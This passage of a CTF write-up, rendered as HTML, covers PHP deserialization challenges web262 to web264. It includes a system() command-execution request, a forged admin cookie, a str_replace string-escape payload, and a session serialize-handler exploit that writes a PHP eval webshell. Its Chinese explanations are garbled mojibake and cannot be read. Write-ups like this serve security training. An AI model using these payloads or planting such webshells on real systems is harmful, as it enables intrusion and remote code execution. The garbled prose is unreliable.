number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token number">877.</span>php       <span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag_is_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web262-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web262-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web262(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)"></a>web262(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>message.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ ¹æ®message.phpæç¤ºï¼ŒCookieä¼ å…¥æ„é€ å¥½çš„msgå³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span></code></pre><p>æ­£ç¡®åšæ³•åº”è¯¥æ˜¯è¿ç”¨<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong>ï¼Œè¿ç”¨çš„æ€æƒ³è·Ÿsqlæ³¨å…¥çš„é—­åˆç›¸ä¼¼</p><p>æˆ‘ä»¬è¿™é‡Œæœ‰ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¦æ”¹å˜tokenå±æ€§ï¼Œä½†æˆ‘ä»¬æ— æ³•ç›´æ¥æ§åˆ¶å®ƒçš„å€¼ã€‚</p><p>æˆ‘ä»¬åªèƒ½ç»™fromï¼Œmsgï¼Œtoä¼ é€’å€¼ï¼Œå³è¿™ä¸‰ä¸ªå±æ€§æ˜¯å¯æ§çš„</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>å‡å¦‚æˆ‘ä»¬å‘toå±æ€§ä¼ é€’ <strong>t&#x3D;3â€;s:5:â€tokenâ€;s:5:â€userâ€;}</strong> å­—ç¬¦ä¸²å°±å˜ä¸ºäº†ä¸‹é¢è¿™æ ·</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;user&quot;;&#125;</code></pre><p>æˆ‘ä»¬å¯¹å­—ç¬¦ä¸²è¿›æ¥äº†é—­åˆï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶tokenå±æ€§çš„å€¼äº†ï¼Œä½†æˆ‘ä»¬ä¹Ÿä¼šå‘ç°ä¸€ç‚¹ï¼Œtoå±æ€§å€¼çš„é•¿åº¦å˜ä¸ºäº†27ã€‚</p><p>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœä¸º27åˆ™ä¼šåŒ¹é…åé¢27ä¸ªå­—ç¬¦ï¼Œè¿™æ ·é—­åˆå°±æ²¡æœ‰æ•ˆæœã€‚</p><p>è¿™æ—¶å€™é¢˜ç›®ä¸­çš„æ›¿æ¢å­—ç¬¦å‡½æ•°å¯ä»¥å¸®åŠ©åˆ°æˆ‘ä»¬</p><pre class="language-none"><code class="language-none">$umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></pre><p>str_replaceä¼šå°†fuckæ›¿æ¢ä¸ºloveUï¼Œä¸”æ›¿æ¢æ˜¯åœ¨åºåˆ—åŒ–ä¹‹åè¿›è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å®é™…å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†1ï¼Œä½†æ ‡æ˜çš„å­—ç¬¦ä¸²é•¿åº¦ä»»ç„¶ä¸ºåŸå€¼</strong></p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; æ›¿æ¢å‰s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;&#x2F;&#x2F; æ›¿æ¢ås:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</code></pre><p>é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‡­ç©ºå¢åŠ å­—ç¬¦ï¼Œæ¥æˆåŠŸè¿›è¡Œé—­åˆ</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x2F;&#x2F; åé¢å¤šå‡º27ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™27ä¸ªfuckï¼Œæ›¿æ¢ä¸ºloveUåï¼Œå¢åŠ äº†27ä¸ªå­—ç¬¦ï¼Œæ¥è¾¾åˆ°å­—ç¬¦ä¸²é€ƒé€¸</code></pre><p>æœ€ç»ˆæˆ‘ä»¬çš„payloadä¸º</p><pre class="language-none"><code class="language-none">f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h4 id="web263-Sessionååºåˆ—åŒ–"><a href="#web263-Sessionååºåˆ—åŒ–" class="headerlink" title="web263(Sessionååºåˆ—åŒ–)"></a>web263(Sessionååºåˆ—åŒ–)</h4><p>åˆšå¼€å§‹ä»¥ä¸ºå¼±å¯†ç ï¼Œä½†æ˜¯æˆåŠŸï¼Œäºæ˜¯æ‰«æåˆ°å¤‡ä»½æ–‡ä»¶<code>www.zip</code></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>inc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ä½¿ç”¨"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç™»é™†"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"æˆåŠŸ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"å¤±è´¥"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>inc.phpæœ‰file_put_contentsï¼Œå¯å†™æœ¨é©¬ï¼Œuseræ§åˆ¶æ–‡ä»¶åï¼Œpasså†™ä¸€å¥è¯</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span> æŒ‡å®šå‚¨å­˜çš„è·¯å¾„session<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> æŒ‡å®šå‚¨å­˜æ—¶ä½¿ç”¨çš„å‡½æ•°ï¼ˆé»˜è®¤æ˜¯fileï¼‰session<span class="token operator">.</span>auto_start boolensession<span class="token operator">.</span>serialize_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> å®šä¹‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å¤„ç†å™¨çš„åå­—ï¼Œé»˜è®¤æ˜¯<span class="token function">php</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token number">.4</span>åæ”¹ä¸ºphp_serialize<span class="token punctuation">)</span></code></pre><p>ä½¿ç”¨ <code>ini_set</code> æŒ‡å®šäº† <code>serialize_handler</code> ä¸º <code>php</code>ï¼Œå¦‚æœé»˜è®¤çš„ <code>serialize_handler</code> ä¸º <code>php_serialize</code>ï¼Œå°±å¯ä»¥é€šè¿‡åœ¨åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¹‹å‰åŠ  <code>|</code>ï¼Œååºåˆ—åŒ–ä»»æ„å¯¹è±¡ã€‚</p><ul><li><p>php_binary: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p></li><li><p>php: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</p></li><li><p>php_serialize(php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p><blockquote><p>æ³¨æ„ï¼šåœ¨ <code>php 5.5.4</code> ä»¥å‰é»˜è®¤é€‰æ‹©çš„æ˜¯ <code>php</code>ï¼Œ<code>5.5.4</code> ä¹‹åå°±æ˜¯ <code>php_serialize</code>ï¼Œè¿™é‡Œçš„ <code>php</code> ç‰ˆæœ¬ä¸º <code>7.3.11</code>ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯ <code>php_serialize</code>ã€‚</p></blockquote></li></ul><p>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œé¦–å…ˆåœ¨index.phpä¸­çš„ <code>$COOKIE[&#39;limit&#39;]</code> ä¸­æ„é€  <code>|+åºåˆ—åŒ–å¯¹è±¡</code> çš„å­—ç¬¦ä¸²ï¼Œè®¿é—®é¦–é¡µå†™å…¥ <code>session</code>ï¼Œå†é€šè¿‡ <code>check.php</code> åŠ è½½çš„ <code>inc.php</code> ä¸­çš„ <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> å°† <code>session</code> ä»¥ <code>session.serialize_handler=php</code> çš„æ ¼å¼ååºåˆ—åŒ–ï¼Œæ‰§è¡Œ <code>User</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•å†™ <code>shell</code>ã€‚<br>æ„é€  <code>payload</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);phpinfo();?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span></code></pre><p>è®¿é—®index.phpæ—¶ä¿®æ”¹Cookieå¹¶å‘é€ï¼Œç„¶åè®¿é—®check.phpè§¦å‘ååºåˆ—åŒ–ï¼Œæœ€ååœ¨æ ¹ç›®å½•ä¸‹<code>/log-a.php</code>åˆšå¼€å§‹æ–‡ä»¶æˆåŠŸå†™å…¥äº†ï¼Œæ²¡æ³•å‘½ä»¤æ‰§è¡Œï¼Œæœ¨é©¬åé¢åŠ ä¸ª<code>phpinfo()</code>å°±å¯ä»¥äº†ï¼Œå¾ˆå¥‡æ€ª</p><h4 id="web264-Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#web264-Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="web264(Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸)"></a>web264(Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>è¿™æ¬¡ç›¸æ¯” <code>web262</code> æœ‰äº† <code>session</code> çš„é™åˆ¶ï¼Œå°±ä¸èƒ½è‡ªå·±æ„é€ äº†ï¼Œç”¨èµ·æ¥ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string 